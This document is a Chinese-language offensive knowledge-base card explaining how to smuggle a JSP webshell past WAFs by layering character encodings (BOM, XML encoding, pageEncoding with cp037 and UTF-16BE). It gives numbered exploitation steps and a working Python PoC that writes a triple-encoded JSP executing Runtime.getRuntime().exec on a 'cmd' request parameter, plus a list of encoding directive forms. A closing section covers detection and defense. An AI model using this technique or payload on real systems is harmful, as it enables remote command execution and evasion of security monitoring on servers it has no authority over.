---
id: web-generic-file-upload-jsp-multi-encoding-pageencoding-waf-bypass
title: JSP 单/双/三编码绕过 WAF：BOM、XML encoding 与 pageEncoding 分层解码，WAF 看到乱码而容器解出可执行 JSP
type: scenario
domain: web
path: web/generic/file-upload
technique: jsp-multi-encoding-pageencoding-waf-bypass
tags:
- web
- file-upload
- jsp
- encoding
- xml
- pageencoding
- waf-bypass
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V481
  verified_at: '2026-11-10T20:33:14+08:00'
  notes: 已对照幻灯片26-31核对：W3C 解码顺序（BOM→XML encoding→pageEncoding/contentType→默认UTF-8）、XMLEncodingDetector 的 BOM 分支、双编码（cp037 声明+分段）与三编码（utf-8 声明段/utf-16be 代码段/cp037 指令段/utf-16be 剩余段，Python 分段 encode 拼接）以及反编译结果均与截图一致。未验证点：未在真实容器执行，混合编码支持与段顺序依容器版本而定（卡内已注明）。
url: /docs/web/generic/file-upload/web-generic-file-upload-jsp-multi-encoding-pageencoding-waf-bypass/
draft: false
kb_aliases:
- JSP 双编码
- JSP 三编码
- pageEncoding 绕过 WAF
- XML encoding cp037
- JSP 文件编码混淆
- JSP 编码免杀分层
---

## 一句话结论

JSP/XML 容器按“BOM → XML 声明 `encoding=` → JSP `pageEncoding`/`contentType` charset → 默认编码”的优先级解码源文件；把同一文件的不同段用不同字符集编码并配合多层声明（单编码只改整体字符集，双/三编码把 XML 声明、pageEncoding 指令与代码段分别用 cp037/UTF-16BE 等编码拼接），WAF 按单一编码读取只能看到乱码与碎片，容器沿声明链逐层解码后得到完整的 `Runtime.getRuntime().exec(...)` 并编译执行。

## 原理

- **编码判定顺序**：Jasper 的 `XMLEncodingDetector.getEncodingName` 先看文件头部 BOM（`FE FF`→UTF-16BE、`FF FE`→UTF-16LE，另识别 UCS-4 BOM），无 BOM 则扫描 `<?xml ... encoding='...'?>` 声明，再没有就用 `pageEncoding` / `contentType` 中的 charset，最后默认 UTF-8（部分旧版本/普通 JSP 语法默认 ISO-8859-1）。幻灯片中的 W3C 规则：有 BOM 按 BOM，否则按标签声明的编码，都没有则 UTF-8。
- **单编码**：把整个 JSP 用一种非常见字符集（如 cp037、UTF-16BE）保存，并在 XML 声明或 `pageEncoding` 中声明同一字符集。容器解码后仍是正常 JSP；WAF 若固定按 UTF-8/ASCII 读取，看到的是 NUL 字节或非 ASCII 乱码，关键字匹配失效。
- **双编码**：文件开头用可读的 ASCII/UTF-8 写 `<?xml version="1.0" encoding='cp037'?>`，让容器先以 cp037 解码；紧随其后的指令段也用 cp037 编码成 `<%@ page pageEncoding="UTF-16BE"%>`（因此在 cp037 视图下可读），容器读到该指令后把后续内容切换为 UTF-16BE 解码，代码段以 UTF-16BE 写入——同一文件里两种编码各司其职。
- **三编码**：在双编码基础上再加一层，把 XML 声明（UTF-8）、代码段（UTF-16BE）、pageEncoding 指令（cp037）、剩余代码（UTF-16BE）分段拼接。幻灯片总结的解析顺序：XML encoding 最先被解析，`<jsp:directive>`/`<%@` 的 pageEncoding 解析在后，两种方式不冲突、可叠加。
- **为什么能骗过 WAF**：编码声明是自引用的——后续字节怎么解码取决于前面解出来的文本；单次、单一编码的解码器无法跟随这条链，只能看到乱码里夹着少量可读指令。容器严格按声明链解码，最终得到的仍是语义完整的 JSP 源码。
- **边界**：具体的字节顺序、切换时机与是否支持混合编码取决于 Jasper 版本与文件语法（普通 JSP vs JSPX）；BOM 会覆盖其它声明；`contentType` 的 charset 在部分版本还兼作页面编码回退。构造后必须在目标同版本容器上实测，不能假设所有容器行为一致。

## 触发条件

- 目标允许上传/写入 JSP，且攻击者能控制文件的原始字节（二进制上传、压缩包解包、写文件等，不是只能文本表单粘贴）；
- 容器为 Tomcat/Jasper 或兼容实现，能识别 BOM/XML 声明/pageEncoding；
- WAF/静态检测按单一编码（通常是 UTF-8）读取文件并做关键字匹配，未按声明链解码归一化；
- 所选字符集被目标容器/JDK 支持（UTF-16BE、cp037 等）。

## 利用步骤

1. 先按“单编码”验证目标：把整个 JSP 用 UTF-16BE 保存并在 `pageEncoding`/XML 声明中声明，确认容器能编译执行、WAF 是否放行。
2. 若单编码被识别，升级“双编码”：XML 声明段用 UTF-8 写 `encoding='cp037'`，pageEncoding 指令段用 cp037 编码，代码段用 UTF-16BE 编码，按容器解码顺序拼接。
3. 必要时用“三编码”：UTF-8 声明 + UTF-16BE 代码 + cp037 指令 + UTF-16BE 代码，逐段写入同一文件。
4. 上传并访问，确认命令执行；若失败，抓取容器报错并调整段顺序/声明位置/字符集。
5. 与 Unicode 转义、JSPX、标签层手法组合，提高绕过成功率。

## PoC

```python
# 三编码 JSP 构造（按幻灯片思路整理；编码与段顺序需按目标容器实测调整）
a0 = '''<?xml version="1.0" encoding='cp037'?>'''
a1 = '''<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
java.io.BufferedReader input = new java.io.BufferedReader(
    new java.io.InputStreamReader(p.getInputStream()));
String line = "";'''
a2 = '''<%@ page pageEncoding="UTF-16BE"%>'''
a3 = '''
while ((line = input.readLine()) != null) {
    out.write(line + "\\n");
}
%>'''

with open("triple.jsp", "wb") as f:
    f.write(a0.encode("utf-8"))
    f.write(a1.encode("utf-16be"))
    f.write(a2.encode("cp037"))
    f.write(a3.encode("utf-16be"))
```

```text
# 可用的编码声明位置（幻灯片列出）
<?xml version="1.0" encoding="utf-8" ?>
<%@ page language="java" pageEncoding="utf-16be"%>
<%@ page contentType="charset=utf-16be" %>
<%@ tag language="java" pageEncoding="utf-16be"%>
<%@ tag contentType="charset=utf-16be" %>
<jsp:directive.page pageEncoding="utf-16be" />
<jsp:directive.page contentType="charset=utf-16be" />
<jsp:directive.tag pageEncoding="utf-16be" />
<jsp:directive.tag contentType="charset=utf-16be" />
```

幻灯片展示了 cp037 解码视图（大部分乱码、指令可读）与 UTF-16BE 解码视图（代码可读）的对比，以及最终编译出的 `Runtime.getRuntime().exec` 调用；以上脚本为按思路整理，未在真实目标执行。

## 变体与关联

- 变体：单编码（整文件 UTF-16BE/cp037）——最基础的版本，见 [[web-java-rce-jsp-pageencoding-static-detection-bypass]]。
- 变体：仅用 BOM 触发 UTF-16 解码；仅用 XML 声明；仅用 `pageEncoding`；用 `contentType` charset 作为回退。
- 变体：把编码混淆与 Java Unicode 转义、JSPX/XML 实体拆分组合，形成多层表示差异。
- 关联：[[web-generic-file-upload-jsp-java-unicode-escape-waf-bypass]]（字符级转义）、[[web-generic-file-upload-jspx-xml-pi-entity-cdata-waf-bypass]]（XML 语法层拆分）。
- 边界：不同容器/版本对混合编码的支持差异大；BOM 优先于其它声明；文件必须能被容器按声明链解码，否则直接编译失败。

## 检测与防御

- 检测（WAF）：先检测 BOM 与 XML/pageEncoding 声明，按声明链完整解码文件（支持多段混合编码）后再做关键字/语法匹配；对“乱码中夹着可读 JSP 指令”的文件直接告警。
- 检测（主机）：work 目录生成的 Java/class 中出现 `Runtime.getRuntime().exec`；上传的 JSP 含非 UTF-8 声明、BOM 或字符集混用；访问后产生子进程。
- 防御：禁止上传 JSP 及可解析脚本后缀；上传文件统一转码/归一化为 UTF-8 后再检测与存储；上传目录移出 Web 根并不可执行；WAF 采用按目标容器语义的解码器。
